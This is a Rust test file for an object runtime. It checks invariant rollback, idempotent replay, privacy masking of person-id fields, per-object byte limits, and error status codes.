    let seq = |o: &Output| match o {
        Output::Changed { seq, .. } => *seq,
        _ => 0,
    };
    let all = rt.changed_since(&["Slot/*".into()], 0);
    assert_eq!(all.len(), 1000);
    let newest = all.iter().map(seq).max().unwrap();
    assert!(all.iter().any(|o| matches!(o, Output::Changed { object, .. } if object == "Slot/s0001")), "the last one changed is sent");
    let resumed = rt.changed_since(&["Slot/*".into(), "Slot/s0001".into()], newest - 1);
    assert_eq!(resumed.len(), 1, "resuming sends the newest change once: {resumed:?}");

    // A device lists the replicas it kept, offline, before the server answers.
    let src = format!("{SLOTS}\nfunction App() {{\n  return <Column>{{Slot.all().map(s => <Text key={{s.id}}>{{s.title}}</Text>)}}</Column>\n}}\n");
    let store = Shared::default();
    let (mut device, _) = boot_as(&src, store.clone(), 0.0, false);
    device.handle(1.0, Input::Sync { object: "Slot/s9".into(), state: json!({ "title": "Beard" }), seq: Some(3) });
    device.handle(1.5, Input::Tick);
    let (mut device, out) = boot_as(&src, store, 2.0, false);
    assert!(format!("{out:?}").contains("Beard"), "kept replicas are listed offline: {out:?}");
    // Another user signs in: the class is asked for again, and the old replicas are not members.
    let out = device.handle(3.0, Input::Identity { user: Some("user:bo".into()), roles: Vec::new() });
    assert!(out.iter().any(|o| matches!(o, Output::Subscribe { object, .. } if object == "Slot/*")), "{out:?}");
    assert!(!format!("{out:?}").contains("Beard"), "{out:?}");
    assert!(!tj_core::runtime::access::owns("*", "*"), "nobody owns a whole class");
}

#[test]
fn a_screen_that_shows_the_time_is_drawn_again_each_minute() {
    let src = "function App() {\n  return <Text id=\"t\">{Date.now() >= 120000 ? \"past\" : \"soon\"}</Text>\n}\n";
    let (mut rt, out) = boot_with(src, Shared::default(), 0.0);
    assert!(format!("{out:?}").contains("soon"), "{out:?}");
    assert_eq!(rt.inspect()["wake"], json!(60000.0), "it wakes at the next minute");
    assert!(!format!("{:?}", rt.handle(119_000.0, Input::Tick)).contains("past"));
    let out = rt.handle(120_000.0, Input::Tick);
    assert!(format!("{out:?}").contains("past"), "drawn again on the minute: {out:?}");

    // A screen that never reads the clock is not woken.
    let (rt, _) = boot_with("function App() {\n  return <Text>hi</Text>\n}\n", Shared::default(), 0.0);
    assert_eq!(rt.inspect()["wake"], Json::Null);
}

#[test]
fn encode_uri_component_works_as_in_javascript() {
    let mut rt = boot("object U {\n  enc(s: string): string { return encodeURIComponent(s) }\n}\n");
    assert_eq!(call(&mut rt, 1.0, "U/u", "enc", json!(["a b&c/é?x=1-_.!~*'()"])).unwrap(), json!("a%20b%26c%2F%C3%A9%3Fx%3D1-_.!~*'()"));
}

#[test]
fn invariants_roll_back_bad_mutations_and_failed_calls_are_atomic() {
    // Compile errors with fix hints for invalid @invariant usage.
    assert!(compile("object A { @invariant bad(x: number): boolean { return x > 0 } }").is_err());
    assert!(compile("@server @read(\"anyone\") object A { @invariant @allow(\"anyone\") ok(): boolean { return true } }").is_err());
    assert!(compile("object A { @invariant(\"x\") ok(): boolean { return true } }").is_err());

    let src = r#"
@server @read("anyone") object Account {
  balance: number = 100
  log: string[] = []
  @invariant nonNegative(): boolean { return this.balance >= 0 }
  @allow("anyone") deposit(n: number) { this.balance += n }
  @allow("anyone") withdraw(n: number) {
    this.balance -= n
    this.emit("withdrew", { n })
    this.schedule("fee", 5000, "chargeFee")
  }
  @allow("anyone") transferTo(other: string, n: number) {
    Account.get(other).deposit(n)
    this.balance -= n
  }
  @allow("anyone") mutateThenThrow(n: number) {
    this.balance += n
    this.schedule("fee", 5000, "chargeFee")
    this.emit("mutated", { n })
    throw new Error("boom")
  }
  private chargeFee() { this.log.push("fee") }
}
"#;
    let mut rt = server(src, false);
    let anon = || who("", &[]);

    // Valid mutation passes the invariant and saves.
    assert!(call_as(&mut rt, 1.0, "Account/a", "deposit", json!([50]), anon()).is_ok());
    assert_eq!(state(&mut rt, 2.0, "Account/a")["balance"], json!(150));

    // Breaking @invariant rolls back state, alarms and emits, and returns status 422.
    let out = rt.handle(3.0, Input::Call { object: "Account/a".into(), method: "withdraw".into(), args: vec![json!(200)], reply: Some(1), call: None, caller: anon() });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { error: Some(e), status: Some(422), .. } if e.contains("Account.nonNegative"))), "{out:?}");
    assert!(!out.iter().any(|o| matches!(o, Output::Emit { name, .. } if name == "withdrew")), "no phantom emit: {out:?}");
    assert_eq!(state(&mut rt, 4.0, "Account/a")["balance"], json!(150), "balance rolled back");
    rt.handle(10_000.0, Input::Tick);
    assert_eq!(state(&mut rt, 11_000.0, "Account/a")["log"], json!([]), "scheduled alarm rolled back too");

    // Multi-object mutation rolls back BOTH objects if any touched object breaks its invariant.
    let err = call_as(&mut rt, 12.0, "Account/a", "transferTo", json!(["b", 500]), anon()).unwrap_err();
    assert_eq!(err.0, Some(422));
    assert_eq!(state(&mut rt, 13.0, "Account/a")["balance"], json!(150));
    assert_eq!(state(&mut rt, 14.0, "Account/b")["balance"], json!(100), "receiver deposit rolled back atomically");

    // Uncaught throw rolls back state, alarms and emits atomically, while idempotency still caches the error.
    let out = rt.handle(15.0, Input::Call { object: "Account/a".into(), method: "mutateThenThrow".into(), args: vec![json!(25)], reply: Some(2), call: Some("k1".into()), caller: anon() });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { error: Some(e), .. } if e.contains("boom"))), "{out:?}");
    assert!(!out.iter().any(|o| matches!(o, Output::Emit { name, .. } if name == "mutated")), "{out:?}");
    assert_eq!(state(&mut rt, 16.0, "Account/a")["balance"], json!(150), "thrown call rolled back balance");
    rt.handle(25_000.0, Input::Tick);
    assert_eq!(state(&mut rt, 26_000.0, "Account/a")["log"], json!([]), "thrown call rolled back alarm");
    // Replaying the idempotent key returns the cached error without mutating.
    let replay = rt.handle(27.0, Input::Call { object: "Account/a".into(), method: "mutateThenThrow".into(), args: vec![json!(25)], reply: Some(3), call: Some("k1".into()), caller: anon() });
    assert!(replay.iter().any(|o| matches!(o, Output::Reply { error: Some(e), .. } if e.contains("boom"))), "{replay:?}");

    // `check_invariants()` verifies all stored live objects cleanly (`Account/a`; `Account/b` was rolled back).
    assert_eq!(rt.check_invariants().unwrap(), 1);
}

#[test]
fn invariant_and_rollback_edge_cases_from_critic_035() {
    // C-035.11: @invariant rejects @exclusive / @needs at compile time and forbids state mutation at runtime.
    assert!(compile("object A { @invariant @exclusive ok(): boolean { return true } }").is_err());
    assert!(compile("@server @read(\"owner\") object A { @invariant @needs(\"consent:a\") ok(): boolean { return true } }").is_err());
    let mut mut_rt = server(r#"
@server @read("anyone") object Bad {
  n: number = 0
  @invariant sneaky(): boolean { this.n = 99; return true }
  @allow("anyone") bump() { this.n += 1 }
}
"#, false);
    let err = call_as(&mut mut_rt, 1.0, "Bad/a", "bump", json!([]), who("", &[])).unwrap_err();
    assert_eq!(err.0, Some(422));
    assert_eq!(state(&mut mut_rt, 2.0, "Bad/a")["n"], json!(0));

    // C-035.2: `this.delete()` + invalid mutation cannot bypass @invariant; `this.delete()` + throw restores metadata.
    let del_src = r#"
@server @read("anyone") object Item {
  balance: number = 10
  @invariant nonNeg(): boolean { return this.balance >= 0 }
  @allow("anyone") set(n: number) { this.balance = n }
  @allow("anyone") bypass() { this.delete(); this.balance = -5 }
  @allow("anyone") deleteThenThrow() { this.delete(); throw new Error("nope") }
  @allow("anyone") remove() { this.delete() }
}
"#;
    let mut rt = server(del_src, false);
    let anon = || who("", &[]);
    call_as(&mut rt, 100.0, "Item/x", "set", json!([25]), anon()).unwrap();
    assert_eq!(call_as(&mut rt, 101.0, "Item/x", "bypass", json!([]), anon()).unwrap_err().0, Some(422));
    assert_eq!(state(&mut rt, 102.0, "Item/x")["balance"], json!(25));
    assert!(call_as(&mut rt, 103.0, "Item/x", "deleteThenThrow", json!([]), anon()).is_err());
    assert_eq!(state(&mut rt, 104.0, "Item/x")["balance"], json!(25));
    // Subsequent invalid mutation MUST still be caught (cleared was restored to false).
    assert_eq!(call_as(&mut rt, 105.0, "Item/x", "set", json!([-1]), anon()).unwrap_err().0, Some(422));
    assert_eq!(state(&mut rt, 106.0, "Item/x")["balance"], json!(25));
    // Pure `this.delete()` succeeds cleanly.
    assert!(call_as(&mut rt, 107.0, "Item/x", "remove", json!([]), anon()).is_ok());

    // C-035.5 & C-035.6: @invariant failure before `await fetch` drops Output::Effect & cancels fiber;
    // `call_once` caches the 422 result cleanly.
    let async_src = r#"
@server @read("anyone") object Pay {
  balance: number = 10
  @invariant nonNeg(): boolean { return this.balance >= 0 }
  @allow("anyone") deposit(n: number) { this.balance += n }
  @allow("anyone") async overdrawAndFetch(n: number): string {
    this.balance -= n
    await fetch("https://example.com/hook")
    return "sent"
  }
}
"#;
    let mut rt = server(async_src, false);
    let out = rt.handle(1.0, Input::Call { object: "Pay/p".into(), method: "overdrawAndFetch".into(), args: vec![json!(50)], reply: Some(10), call: Some("idem-422".into()), caller: anon() });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { reply: 10, error: Some(_), status: Some(422), .. })), "{out:?}");
    assert!(!out.iter().any(|o| matches!(o, Output::Effect { .. })), "uncommitted fetch effect must be dropped: {out:?}");
    assert_eq!(state(&mut rt, 2.0, "Pay/p")["balance"], json!(10));
    // Even after a deposit makes balance 100, replaying `idem-422` returns the cached 422 error without running!
    call_as(&mut rt, 3.0, "Pay/p", "deposit", json!([90]), anon()).unwrap();
    let replay = rt.handle(4.0, Input::Call { object: "Pay/p".into(), method: "overdrawAndFetch".into(), args: vec![json!(50)], reply: Some(11), call: Some("idem-422".into()), caller: anon() });
    assert!(replay.iter().any(|o| matches!(o, Output::Reply { reply: 11, error: Some(_), status: Some(422), .. })), "cached 422: {replay:?}");
    assert_eq!(state(&mut rt, 5.0, "Pay/p")["balance"], json!(100), "replayed 422 did not re-execute");

    // C-035.1 & C-035.3: two alarms failing @invariant in the same tick do not loop, and a
    // failing due timer never clobbers a committed request's Reply or Emit in the same handle().
    let timer_src = r#"
@server @read("anyone") object Box {
  n: number = 0
  @invariant nonNeg(): boolean { return this.n >= 0 }
  @allow("anyone") arm(delay: number) { this.schedule(delay, "bad") }
  @allow("anyone") ok(): string { this.n += 1; this.emit("ok", {}); return "good" }
  private bad() { this.n = -1 }
}
"#;
    let mut rt = server(timer_src, false);
    call_as(&mut rt, 1.0, "Box/1", "arm", json!([10]), anon()).unwrap();
    call_as(&mut rt, 1.0, "Box/2", "arm", json!([10]), anon()).unwrap();
    // Request `ok()` arrives at t=20 when both failing alarms are due: `ok()` commits cleanly!
    let out = rt.handle(20.0, Input::Call { object: "Box/3".into(), method: "ok".into(), args: vec![], reply: Some(99), call: None, caller: anon() });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { reply: 99, ok: Some(v), .. } if *v == json!("good"))), "{out:?}");
    assert!(out.iter().any(|o| matches!(o, Output::Emit { object, name, .. } if object == "Box/3" && name == "ok")), "{out:?}");
    assert_eq!(state(&mut rt, 21.0, "Box/1")["n"], json!(0));
    assert_eq!(state(&mut rt, 21.0, "Box/2")["n"], json!(0));

    // C-035.1 (disk-save failure during alarm): does not infinite loop in fire_timers().
    let flaky = Flaky::default();
    let mut frt = Runtime::boot(compile(timer_src).unwrap(), Box::new(flaky.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    call_as(&mut frt, 1.0, "Box/1", "arm", json!([10]), anon()).unwrap();
    // Fail disk writes during the tick when the alarm fires: must return cleanly (no hang) and retry next tick.
    flaky.1.set(true);
    let out = frt.handle(20.0, Input::Tick);
    assert!(out.iter().any(|o| matches!(o, Output::Error { .. })), "{out:?}");
    flaky.1.set(false);
    let _ = frt.handle(30.0, Input::Tick);

    // C-035.4: GDPR erasure on a shared object with `@invariant` succeeds without deadlocking.
    let gdpr_src = r#"
@server @read("anyone") object Slot {
  status: string = "open"
  @read("staff", "self") customer: string = ""
  @invariant bookedNeedsCustomer(): boolean { return this.status !== "booked" || this.customer !== "" }
  @allow("signedIn") book() { this.status = "booked"; this.customer = caller.id }
}
"#;
    let mut grt = server(gdpr_src, false);
    call_as(&mut grt, 1.0, "Slot/s1", "book", json!([]), who("user:ana", &[])).unwrap();
    let erased = grt.erase_subject("user:ana", None).expect("erasure must not be blocked by app invariant");
    assert!(erased.erased.contains(&"Slot/s1#customer".to_string()), "{:?}", erased.erased);
}

#[test]
fn schedule_checks_every_argument_and_tools_mask_self_person_fields() {
    // P48-1: non-literal method name or 2-arg unkeyed schedule must still taint-check every arg.
    let keyed_var_method = r#"
@server @read("owner") object User {
  @pii("contact", "account") email: string = ""
  @allow("owner") arm(m: string) { this.schedule(this.email, 60000, m) }
  private remind() {}
}
"#;
    let err1 = compile(keyed_var_method).err().expect("must fail privacy flow check");
    assert!(err1.iter().any(|d| d.message.contains("this.email") && d.message.contains("alarm")), "{err1:?}");

    let unkeyed_two_args = r#"
@server @read("owner") object User {
  @pii("contact", "account") email: string = ""
  @allow("owner") arm() { this.schedule(60000, this.email) }
}
"#;
    let err2 = compile(unkeyed_two_args).err().expect("must fail privacy flow check");
    assert!(err2.iter().any(|d| d.message.contains("this.email") && d.message.contains("alarm")), "{err2:?}");

    // P48-2: tools (`inspect` and `Caller::trusted()` `Get`) mask `@read(..., "self")` person-id
    // fields with presence masking (`""` when empty, `"•••"` when set).
    let slot_src = r#"
@server @read("anyone") object Slot {
  title: string = ""
  @read("staff", "self") customer: string = ""
  @allow("signedIn") book() { this.customer = caller.id }
}
"#;
    let mut rt = server(slot_src, false);
    // Unbooked: inspect and trusted Get show empty string `""`.
    let _ = state(&mut rt, 1.0, "Slot/s1");
    let snap_empty = rt.inspect();
    let s1_empty = snap_empty["objects"].as_array().unwrap().iter().find(|o| o["object"] == "Slot/s1").unwrap();
    assert_eq!(s1_empty["state"]["customer"], json!(""));
    assert_eq!(state(&mut rt, 1.5, "Slot/s1")["customer"], json!(""));

    // Booked by Ana: Ana and staff see `"user:ana"`, while inspect and trusted Get see `"•••"`.
    call_as(&mut rt, 2.0, "Slot/s1", "book", json!([]), who("user:ana", &[])).unwrap();
    let snap_booked = rt.inspect();
    let s1_booked = snap_booked["objects"].as_array().unwrap().iter().find(|o| o["object"] == "Slot/s1").unwrap();
    assert_eq!(s1_booked["state"]["customer"], json!("•••"), "inspect must mask \"self\" person IDs");
    assert_eq!(state(&mut rt, 2.5, "Slot/s1")["customer"], json!("•••"), "trusted Get must mask \"self\" person IDs");
    // Remote owner and staff still see the real id.
    let get_as = |rt: &mut Runtime, caller: Option<Caller>| -> Json {
        let out = rt.handle(3.0, Input::Get { object: "Slot/s1".into(), reply: Some(1), caller });
        out.into_iter().find_map(|o| match o { Output::Reply { ok, .. } => ok, _ => None }).unwrap()
    };
    assert_eq!(get_as(&mut rt, who("user:ana", &[]))["customer"], json!("user:ana"));
    assert_eq!(get_as(&mut rt, who("key:sam", &["staff"]))["customer"], json!("user:ana"));
    assert_eq!(get_as(&mut rt, who("user:bo", &[]))["customer"], json!("•••"));
}

#[test]
fn invariant_purity_compile_checks_and_ui_reply_dedup() {
    // P3A-R2: `@invariant` using `await` or omitting `return true` or returning non-boolean fails `compile()`.
    let await_inv = r#"
@server @read("anyone") object A {
  n: number = 0
  @invariant bad(): boolean { const _ = await fetch("https://example.com"); return true }
}
"#;
    assert!(compile(await_inv).err().expect("await in invariant").iter().any(|d| d.message.contains("await")));

    let missing_ret = r#"
@server @read("anyone") object B {
  n: number = 0
  @invariant bad() { check(this.n >= 0, "n", "negative") }
}
"#;
    assert!(compile(missing_ret).err().expect("missing return in invariant").iter().any(|d| d.message.contains("boolean")));

    let wrong_ret = r#"
@server @read("anyone") object C {
  n: number = 0
  @invariant bad(): string { return "ok" }
}
"#;
    assert!(compile(wrong_ret).err().expect("wrong return type").iter().any(|d| d.message.contains("boolean")));

    let bare_ret = r#"
@server @read("anyone") object D {
  n: number = 0
  @invariant bad(): boolean { if (this.n < 0) { return } return true }
}
"#;
    assert!(compile(bare_ret).err().expect("bare return in invariant").iter().any(|d| d.message.contains("boolean")));

    let alias_ret = r#"
type Valid = boolean
@server @read("anyone") object E {
  n: number = 0
  @invariant ok(): Valid { return this.n >= 0 }
}
"#;
    assert!(compile(alias_ret).is_ok(), "boolean type alias must be accepted on @invariant");

    let nested_await = r#"
@server @read("anyone") object F {
  n: number = 0
  @invariant bad(): boolean { const fn1 = () => await fetch("https://example.com"); return fn1 !== null }
}
"#;
    assert!(compile(nested_await).err().expect("nested await in invariant").iter().any(|d| d.message.contains("await")));

    // P3A-R1: `@invariant` cannot call `invoke(...)` (even via a plugin helper) or `this.unschedule(...)`.
    let invoke_inv = r#"//# file: app.tj
import { sneakInvoke } from "tj:sneak"
@server @read("anyone") object Side {
  hits: number = 0
  @allow("anyone") bump() { this.hits += 1 }
}
@server @read("anyone") object Main {
  n: number = 0
  @invariant sneak(): boolean {
    sneakInvoke()
    return true
  }
  @allow("anyone") set(v: number) { this.n = v }
}
//# file: tj:sneak
export function sneakInvoke() {
  invoke("Side/s", "bump", [])
}
"#;
    let mut rt = server(invoke_inv, false);
    assert_eq!(call_as(&mut rt, 1.0, "Main/m", "set", json!([1]), who("", &[])).unwrap_err().0, Some(422));
    assert_eq!(state(&mut rt, 2.0, "Side/s")["hits"], json!(0), "invoke inside @invariant must not run");

    let unsched_inv = r#"
@server @read("anyone") object Timer {
  n: number = 0
  armed: boolean = false
  @invariant sneak(): boolean {
    if (this.n > 0) { this.unschedule("ping") }
    return true
  }
  @allow("anyone") arm() { this.schedule(1000, "ping"); this.armed = true }
  @allow("anyone") bump() { this.n += 1 }
  private ping() { this.armed = false }
}
"#;
    let mut trt = server(unsched_inv, false);
    call_as(&mut trt, 1.0, "Timer/t", "arm", json!([]), who("", &[])).unwrap();
    assert_eq!(call_as(&mut trt, 2.0, "Timer/t", "bump", json!([]), who("", &[])).unwrap_err().0, Some(422));
    trt.handle(2000.0, Input::Tick);
    assert_eq!(state(&mut trt, 2001.0, "Timer/t")["armed"], json!(false), "alarm must still fire after blocked unschedule");

    // P3A-R1: `Input::Ui` with `reply: Some(...)` failing `@invariant` before `await` emits
    // only `Output::Reply` (422), never a duplicate `Output::Error`.
    let ui_src = r#"
object State {
  n: number = 1
  @invariant pos(): boolean { return this.n >= 0 }
  async bad() {
    this.n = -1
    await fetch("https://example.com/x")
  }
}
function App() {
  const s = State.get("main")
  return <Button id="go" onPress={() => s.bad()}>Go</Button>
}
"#;
    let (mut dev, _) = boot_as(ui_src, Shared::default(), 0.0, false);
    let out = dev.handle(1.0, Input::Ui { target: Target::Id { id: "go".into() }, event: "onPress".into(), value: Json::Null, reply: Some(42) });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { reply: 42, status: Some(422), .. })), "{out:?}");
    assert!(!out.iter().any(|o| matches!(o, Output::Error { .. })), "reply-bearing UI request must not emit duplicate Output::Error: {out:?}");
}

#[test]
fn per_object_byte_cap_rejects_growth_atomically_allows_shrinking_and_reports_max_bytes() {
    let src = r#"
@server @read("anyone") object Log {
  items: string[] = []
  @allow("anyone") push(s: string): number { this.items.push(s); return this.items.length }
  @allow("anyone") clear(): number { this.items = []; return 0 }
}
@server @read("anyone") object Peer {
  note: string = ""
  @allow("anyone") writeBoth(logId: string, big: string) {
    this.note = "updated"
    Log.get(logId).push(big)
  }
}
"#;
    let store = Shared::default();
    let opts = Options { server: true, render: false, max_object_bytes: 120, ..Options::new(0.0, 7) };
    let mut rt = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), opts).unwrap().0;

    // Small write succeeds and shows up in `stats()["maxBytes"]`.
    call_as(&mut rt, 1.0, "Log/l1", "push", json!(["hi"]), who("", &[])).unwrap();
    let stats = rt.stats();
    let max_b = stats["maxBytes"]["Log"].as_u64().expect("maxBytes.Log");
    assert!(max_b > 0 && max_b <= 120, "maxBytes={max_b}");

    // Oversized write via another object fails with 413 AND atomically rolls back BOTH objects!
    let huge = "x".repeat(200);
    let err = call_as(&mut rt, 2.0, "Peer/p1", "writeBoth", json!(["l1", huge]), who("", &[])).unwrap_err();
    assert_eq!(err.0, Some(413), "{err:?}");
    assert!(err.1.contains("limit"), "{err:?}");
    assert_eq!(state(&mut rt, 3.0, "Peer/p1")["note"], json!(""), "Peer must be rolled back atomically");
    assert_eq!(state(&mut rt, 4.0, "Log/l1")["items"], json!(["hi"]), "Log must remain at pre-call state");

    // Pre-existing oversized record (e.g. cap lowered after deployment) can still be shrunk/cleared.
    let big_opts = Options { server: true, render: false, max_object_bytes: 0, ..Options::new(10.0, 7) };
    let mut rt_big = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), big_opts).unwrap().0;
    call_as(&mut rt_big, 11.0, "Log/l1", "push", json!(["y".repeat(200)]), who("", &[])).unwrap();
    drop(rt_big);

    let tight_opts = Options { server: true, render: false, max_object_bytes: 120, ..Options::new(20.0, 7) };
    let mut rt_tight = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), tight_opts).unwrap().0;
    // Further growth is rejected (413)...
    assert_eq!(call_as(&mut rt_tight, 21.0, "Log/l1", "push", json!(["more"]), who("", &[])).unwrap_err().0, Some(413));
    // ...but shrinking/clearing succeeds!
    assert_eq!(call_as(&mut rt_tight, 22.0, "Log/l1", "clear", json!([]), who("", &[])).unwrap(), json!(0));
    assert_eq!(state(&mut rt_tight, 23.0, "Log/l1")["items"], json!([]));

    // C-039.1 & C-039.6: async + @exclusive hitting max_object_bytes before `await` must NOT leak
    // the fiber or deadlock the @exclusive lock, must count the error, and must reject `invoke()`.
    let async_src = r#"//# file: app.tj
import { callPeer } from "tj:helper"
@server @read("anyone") object Vault {
  items: string[] = []
  @allow("anyone") @exclusive async bloatThenFetch(s: string): string {
    this.items.push(s)
    await fetch("https://example.com/slow")
    return "ok"
  }
  @allow("anyone") @exclusive ping(): string { return "pong" }
  @allow("anyone") push(s: string): string { this.items.push(s); return "pushed" }
  @allow("anyone") pop(): number { this.items.pop(); return this.items.length }
  @allow("anyone") popAndBloatAlarm(big: string): number {
    this.items.pop()
    this.schedule(5000, "noop", big)
    return this.items.length
  }
  private noop(_s: string) {}
  @allow("anyone") async viaInvoke(s: string): string {
    return await callPeer("Vault/v1", "push", [s])
  }
}
//# file: tj:helper
export async function callPeer(obj: string, m: string, a: any[]): any {
  return await invoke(obj, m, a)
}
"#;
    let s2 = Shared::default();
    let mut rt2 = Runtime::boot(compile(async_src).unwrap(), Box::new(s2.clone()), Options { server: true, render: false, max_object_bytes: 160, ..Options::new(0.0, 7) }).unwrap().0;
    let out = rt2.handle(1.0, Input::Call { object: "Vault/v1".into(), method: "bloatThenFetch".into(), args: vec![json!("z".repeat(200))], reply: Some(10), call: Some("cid-1".into()), caller: who("", &[]) });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { reply: 10, status: Some(413), .. })), "{out:?}");
    assert!(!out.iter().any(|o| matches!(o, Output::Effect { .. })), "rolled-back async turn must not emit Effect: {out:?}");
    // `@exclusive` lock was released: next exclusive call succeeds immediately!
    assert_eq!(call_as(&mut rt2, 2.0, "Vault/v1", "ping", json!([]), who("", &[])).unwrap(), json!("pong"));
    assert_eq!(rt2.stats()["methods"]["Vault.bloatThenFetch"]["errors"], json!(1), "413 must increment error count");

    // `invoke()` promise rejects when the invoked method exceeds `max_object_bytes`.
    let inv_err = call_as(&mut rt2, 3.0, "Vault/v1", "viaInvoke", json!(["z".repeat(200)]), who("", &[])).unwrap_err();
    assert!(inv_err.1.contains("limit"), "invoke() must reject on 413: {inv_err:?}");

    // C-039.6(3): on an already-oversized object, a small shrink with `Idempotency-Key` succeeds
    // even though the `CallRecord` itself adds ~120 bytes to the outer wrapper!
    let mut rt_unbounded = Runtime::boot(compile(async_src).unwrap(), Box::new(s2.clone()), Options { server: true, render: false, max_object_bytes: 0, ..Options::new(10.0, 7) }).unwrap().0;
    call_as(&mut rt_unbounded, 11.0, "Vault/v2", "push", json!(["a".repeat(200)]), who("", &[])).unwrap();
    call_as(&mut rt_unbounded, 12.0, "Vault/v2", "push", json!(["b"]), who("", &[])).unwrap();
    drop(rt_unbounded);
    let mut rt_shr = Runtime::boot(compile(async_src).unwrap(), Box::new(s2.clone()), Options { server: true, render: false, max_object_bytes: 160, ..Options::new(20.0, 7) }).unwrap().0;
    let out_pop = rt_shr.handle(21.0, Input::Call { object: "Vault/v2".into(), method: "pop".into(), args: vec![], reply: Some(99), call: Some("shrink-call-1".into()), caller: who("", &[]) });
    assert!(out_pop.iter().any(|o| matches!(o, Output::Reply { reply: 99, ok: Some(v), error: None, .. } if v == &json!(1))), "shrinking state with Idempotency-Key must succeed: {out_pop:?}");

    // T1-9: shrinking state by 1 item while scheduling a huge alarm payload on an already-oversized
    // object MUST be rejected with 413 (no alarm-bloat bypass!).
    let bloat_err = call_as(&mut rt_shr, 22.0, "Vault/v2", "popAndBloatAlarm", json!(["b".repeat(400)]), who("", &[])).unwrap_err();
    assert_eq!(bloat_err.0, Some(413), "alarm bloat on oversized record must fail with 413: {bloat_err:?}");

    // P60-2, P60-3, P60-4, P60-6: VM faults (`null[0] = 1`, `for...of null`) return 500,
    // `store.load` failure inside a method returns 503, and nested `@exclusive` timeout returns
    // 503 counted under `errors` (NOT `refused`).
    let fault_src = r#"
@server @read("anyone") object Faulty {
  @allow("anyone") badIndex() { const a: any = null; a[0] = 1 }
  @allow("anyone") badLoop() { const a: any = null; for (const x of a) { } }
  @allow("anyone") loadPeer(): string { return Peer.get("fail").id }
  @allow("anyone") @exclusive async hold() { await fetch("https://example.com/slow") }
  @allow("anyone") callHold() { Faulty.get("f1").hold() }
}
@server @read("anyone") object Peer {
  v: number = 0
}
"#;
    let mut frt = server(fault_src, false);
    assert_eq!(call_as(&mut frt, 1.0, "Faulty/f1", "badIndex", json!([]), who("", &[])).unwrap_err().0, Some(500));
    assert_eq!(call_as(&mut frt, 2.0, "Faulty/f1", "badLoop", json!([]), who("", &[])).unwrap_err().0, Some(500));
    // Nested `@exclusive` wait-timeout returns 503 and counts under `errors` (not `refused`).
    let _ = frt.handle(10.0, Input::Call { object: "Faulty/f1".into(), method: "hold".into(), args: vec![], reply: Some(1), call: None, caller: who("", &[]) });
    let _ = frt.handle(11.0, Input::Call { object: "Faulty/f1".into(), method: "callHold".into(), args: vec![], reply: Some(2), call: None, caller: who("", &[]) });
    let exp = frt.handle(35_000.0, Input::Tick);
    assert!(exp.iter().any(|o| matches!(o, Output::Reply { reply: 2, status: Some(503), .. })), "{exp:?}");
    assert_eq!(frt.stats()["methods"]["Faulty.callHold"]["errors"], json!(1));
    assert_eq!(frt.stats()["methods"]["Faulty.callHold"]["refused"], json!(0));

    // `store.load` failure inside a method returns 503 (P60-2).
    struct FailLoad;
    impl Store for FailLoad {
        fn load(&mut self, key: &str) -> Result<Option<String>, String> {
            if key == "Peer/fail" { Err("disk io error".into()) } else { Ok(None) }
        }
        fn save(&mut self, _: &str, _: &str) -> Result<(), String> { Ok(()) }
        fn remove(&mut self, _: &str) -> Result<(), String> { Ok(()) }
        fn keys(&mut self, _: &str) -> Result<Vec<String>, String> { Ok(Vec::new()) }
    }
    let mut srt = Runtime::boot(compile(fault_src).unwrap(), Box::new(FailLoad), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    assert_eq!(call_as(&mut srt, 1.0, "Faulty/f1", "loadPeer", json!([]), who("", &[])).unwrap_err().0, Some(503));
}
